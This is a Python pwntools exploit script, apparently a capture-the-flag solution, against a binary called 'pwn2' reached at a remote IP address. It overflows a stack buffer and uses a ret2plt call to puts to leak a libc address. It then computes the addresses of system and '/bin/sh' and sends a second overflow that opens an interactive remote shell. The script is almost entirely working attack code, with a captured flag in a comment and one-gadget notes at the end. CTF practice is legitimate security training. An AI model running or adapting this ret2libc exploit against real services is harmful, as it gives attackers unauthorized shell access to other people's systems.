# coding:utf-8
#flag{f3b92d795c9ee0725c160680acd084d9}
from pwn import *
debug = 0
#context.log_level='debug'
elf = ELF('./pwn2')
#libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
if debug:
    p = process('./pwn2',env={'LD_PRELOAD':'./libc6-i386_2.23-0ubuntu7_amd64.so'})
    libc=ELF('./libc6-i386_2.23-0ubuntu7_amd64.so')
#    gdb.attach(p)
else:
    p = remote('123.59.138.180', 20000)#   
    #libc = ELF('./libc6-i386_2.23-0ubuntu7_amd64.so')
    #libc = ELF('./libc6-i386_2.23-0ubuntu9_amd64.so')
    libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
#    one_gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

init_0 = len('Our %s is a noble %s. He is come from north and well change out would.')
length = init_0 + 256*2
success('len:'+hex(length))

p.recvuntil('First, you need to tell me you name?\n')
p.sendline('a'*250)

p.recvuntil('What\'s you occupation?\n')
p.sendline('a'*250)

p.recvuntil('Do you want to edit you introduce by yourself?[Y/N]\n')
p.sendline('Y')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload = ''
payload += 'a'*0x111
payload += 'b'*4
payload += p32(puts_plt)
payload += p32(0x08048637)
payload += p32(puts_got)
p.sendline(payload)

payload1 = ''
payload1 += p32(puts_plt)
payload1 += p32(0x08048637)
payload1 += p32(puts_got)
p.recvuntil(payload1+'\n\n')
data = u32(p.recv(4))
success('puts_addr:'+hex(data))

libc_base = data - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search('/bin/sh'))
one_gadgets = [0x45216,0x4526a,0xf0274,0xf1117]
success('system_addr:'+hex(system_addr))
success('binsh_addr:'+hex(binsh_addr))
gadget = libc_base + one_gadgets[3]

p.recvuntil('First, you need to tell me you name?\n')
p.sendline('a'*250)

p.recvuntil('What\'s you occupation?\n')
p.sendline('a'*250)

p.recvuntil('Do you want to edit you introduce by yourself?[Y/N]\n')
p.sendline('Y')

payload = ''
payload += 'a'*0x111
payload += 'b'*4

payload += p32(system_addr)
payload += p32(system_addr)
payload += p32(binsh_addr)
p.sendline(payload)

p.sendline('ls\n')

p.interactive()

# 0x3a819	execve("/bin/sh", esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x5f065	execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x5f066	execl("/bin/sh", [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL
